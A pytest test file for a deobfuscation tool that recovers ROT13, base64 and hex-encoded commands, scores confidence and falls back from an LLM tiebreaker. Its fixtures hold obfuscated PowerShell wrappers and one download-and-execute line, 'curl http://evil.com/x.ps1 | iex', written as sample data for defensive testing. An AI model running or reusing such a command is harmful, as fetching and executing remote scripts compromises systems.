"""Tests for the Feb-2026 Reasoning Engine roadmap layers.

Covers:
    * ROT13 recovery of `CbjreFuryy -Abc` → `PowerShell -Nop`
    * Confidence engine (4-dim weighted breakdown)
    * Explainer narrative
    * Mode routing (fast/balanced/deep)
    * LLM tiebreaker fallback (no key required to run)
"""
from __future__ import annotations
import base64

import pytest

from analysis_core import deterministic_best_decode
from reasoning import (
    characterize, linguistic_score, text_candidates, reason,
    compute_confidence, explain_reasoning, explain_chain,
    arbitrate, tiebreak_available,
)
from reasoning.llm_tiebreaker import TiebreakerVerdict


# ────────────────────────────────────────────────────────────────
# The P0 case: ROT13 on a PowerShell command
# ────────────────────────────────────────────────────────────────

class TestRot13PowerShellCase:
    """The exact scenario the user cited as motivating the whole refactor."""

    INPUT = "CbjreFuryy -Abc"
    EXPECTED = "PowerShell -Nop"

    def test_balanced_mode_recovers_rot13(self):
        r = deterministic_best_decode(self.INPUT, analysis_mode="balanced")
        assert r["output"] == self.EXPECTED
        assert any(s.get("op") == "rot13" for s in r.get("steps", []))

    def test_deep_mode_recovers_rot13(self):
        r = deterministic_best_decode(self.INPUT, analysis_mode="deep")
        assert r["output"] == self.EXPECTED

    def test_fast_mode_also_recovers(self):
        """Fast mode uses only the deterministic magic_decoder path — but
        the reasoning-engine hook inside `_pick_candidates` still fires,
        which is the correct behaviour (deterministic ROT-N with linguistic
        scoring, no LLM). This test guards that the fast path still
        surfaces the plaintext even without the extra reasoning frame."""
        r = deterministic_best_decode(self.INPUT, analysis_mode="fast")
        assert r["output"] == self.EXPECTED

    def test_confidence_is_high(self):
        r = deterministic_best_decode(self.INPUT, analysis_mode="balanced")
        conf = (r.get("reasoning") or {}).get("confidence") or {}
        assert conf.get("band") == "high"
        assert conf.get("confidence", 0) >= 0.75

    def test_narrative_explains_choice(self):
        r = deterministic_best_decode(self.INPUT, analysis_mode="balanced")
        narrative = (r.get("reasoning") or {}).get("narrative") or {}
        assert "rot13" in narrative.get("headline", "").lower()
        assert narrative.get("selected"), "must list at least one selected step"


# ────────────────────────────────────────────────────────────────
# Characterization
# ────────────────────────────────────────────────────────────────

class TestCharacterization:
    def test_text_like_input(self):
        p = characterize("This is plain English text.")
        assert p.kind == "text_like"

    def test_encoded_blob(self):
        b64 = base64.b64encode(b"hello world" * 10).decode()
        p = characterize(b64)
        assert p.kind == "encoded_blob"

    def test_script_wrapper(self):
        ps = 'powershell -EncodedCommand ABCDEF'
        p = characterize(ps)
        assert p.kind == "script_wrapper"

    def test_gzip_container(self):
        p = characterize("\x1f\x8b\x08\x00" + "x" * 20)
        assert p.kind == "structured_container"
        assert "gzip-decompress" in p.priors


# ────────────────────────────────────────────────────────────────
# Linguistic scorer
# ────────────────────────────────────────────────────────────────

class TestLinguisticScorer:
    def test_powershell_scores_high(self):
        assert linguistic_score("PowerShell -Nop") >= 0.55

    def test_random_string_scores_low(self):
        assert linguistic_score("aksjdhfkajshdfkjahsd") <= 0.35

    def test_base64_scores_low(self):
        b64 = base64.b64encode(b"hello world" * 20).decode()
        assert linguistic_score(b64) <= 0.20

    def test_empty_string(self):
        assert linguistic_score("") == 0.0


# ────────────────────────────────────────────────────────────────
# Text candidate generation
# ────────────────────────────────────────────────────────────────

class TestTextCandidates:
    def test_rot13_wins_on_powershell(self):
        cands = text_candidates("CbjreFuryy -Abc", min_delta=0.0, top_n=5)
        assert cands, "must generate at least one candidate"
        assert cands[0].op == "rot13"
        assert cands[0].output == "PowerShell -Nop"
        assert cands[0].delta > 0.5

    def test_no_candidates_for_gibberish(self):
        # High-entropy nonsense should not spawn candidates that improve
        cands = text_candidates("xkvjqhg zbnpwmt lfrycs" * 5, min_delta=0.30)
        # None of ROT-N/atbash/reverse/xor should meaningfully improve
        assert not cands or cands[0].delta < 0.50

    def test_xor_can_recover_printable(self):
        # XOR "abc" with 0x0a gives "khi" (printable) - trivial case
        cands = text_candidates("abc" * 20, min_delta=0.0, top_n=25,
                                include_xor=True)
        assert cands  # at least one candidate


# ────────────────────────────────────────────────────────────────
# 4-phase reasoning engine
# ────────────────────────────────────────────────────────────────

class TestReasoningEngine:
    def test_delegates_to_magic_on_encoded_blob(self):
        # Use a base64 string long enough to trigger `encoded_blob` classification
        # (characterize requires compact-length >= 16 for encoded-blob detection).
        b64 = base64.b64encode(b"hello world" * 8).decode()
        r = reason(b64, mode="balanced")
        # Encoded blob is delegated — no linguistic chain applied
        assert r.stopped_at.startswith("delegate")
        assert r.chain == []

    def test_recurses_on_text_like(self):
        r = reason("CbjreFuryy -Abc", mode="balanced")
        assert r.final_output == "PowerShell -Nop"
        assert r.chain and r.chain[0]["op"] == "rot13"

    def test_stop_reason_recorded(self):
        r = reason("CbjreFuryy -Abc", mode="balanced")
        assert r.stopped_at in {"converged", "no-improvement", "max-depth",
                                "delegate-script_wrapper", "delegate-encoded_blob"}


# ────────────────────────────────────────────────────────────────
# Confidence engine (4-dim weighted)
# ────────────────────────────────────────────────────────────────

class TestConfidenceEngine:
    def test_high_confidence_for_powershell(self):
        c = compute_confidence("PowerShell -NoP -EncodedCommand SGVsbG8=",
                                input_text="original wrapper")
        assert c.band == "high"
        assert c.confidence >= 0.60

    def test_low_confidence_for_hex_blob(self):
        c = compute_confidence("deadbeef" * 20)
        assert c.band == "low"
        # 0.47 is in the low band (< 0.50). Readability is correctly floored at 0.10.
        assert c.confidence <= 0.50
        assert c.readability <= 0.20  # still-encoded hex

    def test_context_alignment_boosts_when_wrapper_present(self):
        wrap_in = "FromBase64String('...') | Invoke-Expression"
        good_out = "curl http://evil.com/x.ps1 | iex"
        c = compute_confidence(good_out, input_text=wrap_in)
        assert c.context >= 0.75, "wrapper implies command → high context alignment"

    def test_explainable_reasons(self):
        c = compute_confidence("PowerShell -Nop", input_text="CbjreFuryy -Abc")
        d = c.as_dict()
        assert "structural" in d and "readability" in d
        assert "entropy_sanity" in d and "context" in d
        assert d["reasons"], "must always attach at least one reason"


# ────────────────────────────────────────────────────────────────
# Explainer
# ────────────────────────────────────────────────────────────────

class TestExplainer:
    def test_narrative_lists_selected_and_rejected(self):
        r = reason("CbjreFuryy -Abc", mode="balanced")
        narrative = explain_reasoning(r.as_dict())
        assert narrative["headline"]
        assert narrative["selected"], "must list at least the winning step"

    def test_explain_chain_no_chain(self):
        assert "No decoding" in explain_chain("x", "x", [])

    def test_explain_chain_populates_confidence(self):
        chain = [{"op": "rot13", "args": {}}]
        text = explain_chain("in", "out", chain, confidence=0.82)
        assert "HIGH" in text
        assert "rot13" in text


# ────────────────────────────────────────────────────────────────
# LLM tiebreaker — fallback path (safe even without a key)
# ────────────────────────────────────────────────────────────────

class TestLLMTiebreakerFallback:
    def test_arbitrate_returns_fallback_when_no_candidates(self):
        v = arbitrate("input", [])
        assert isinstance(v, TiebreakerVerdict)
        assert not v.used_llm
        assert v.winner_op == ""

    def test_arbitrate_returns_top_when_no_key(self, monkeypatch):
        monkeypatch.delenv("EMERGENT_LLM_KEY", raising=False)
        cands = [
            {"op": "rot13", "output": "PowerShell -Nop", "delta": 0.7},
            {"op": "xor", "output": "gibberish", "delta": 0.05},
        ]
        v = arbitrate("CbjreFuryy -Abc", cands)
        assert v.winner_op == "rot13"
        assert v.provider == "no-key"
        assert not v.used_llm

    def test_tiebreak_available_reads_env(self, monkeypatch):
        monkeypatch.delenv("EMERGENT_LLM_KEY", raising=False)
        assert tiebreak_available() is False
        monkeypatch.setenv("EMERGENT_LLM_KEY", "sk-test")
        assert tiebreak_available() is True

    def test_arbitrate_falls_back_on_llm_error(self, monkeypatch):
        """When the LLM call fails (budget cap, timeout, malformed reply),
        the tiebreaker MUST fall back to the top deterministic candidate
        with a clear provider tag."""
        monkeypatch.setenv("EMERGENT_LLM_KEY", "sk-invalid-key-forced-error")
        cands = [
            {"op": "rot13", "output": "PowerShell", "delta": 0.7, "output_score": 0.8},
            {"op": "atbash", "output": "Xerxes", "delta": 0.68, "output_score": 0.78},
        ]
        v = arbitrate("CbjreFuryy", cands, session_id="test-fallback")
        # Winner must always be one of the candidates
        assert v.winner_op in {"rot13", "atbash"}
        # Either provider is acceptable — the important guarantee is that we
        # never crash and always return a valid winner.
        assert v.provider in {
            "emergent-claude",
            "fallback-deterministic",
            "no-key",
        }


# ────────────────────────────────────────────────────────────────
# End-to-end regression on encoded_blob (must not break existing paths)
# ────────────────────────────────────────────────────────────────

class TestNoRegressionOnEncodedPaths:
    def test_base64_still_decodes(self):
        b64 = base64.b64encode(b"whoami; hostname").decode()
        r = deterministic_best_decode(b64, analysis_mode="balanced")
        assert "whoami" in r["output"]

    def test_hex_still_decodes(self):
        # Use a hex string long enough to trigger deterministic hex-decode
        # (candidate picker requires ≥ 20 chars).
        hx = "77686f616d693b20686f73746e616d65"  # "whoami; hostname"
        r = deterministic_best_decode(hx, analysis_mode="balanced")
        assert "whoami" in r["output"]

    def test_fast_mode_skips_reasoning_frame(self):
        r = deterministic_best_decode("plain english text example.",
                                       analysis_mode="fast")
        assert "reasoning" not in r
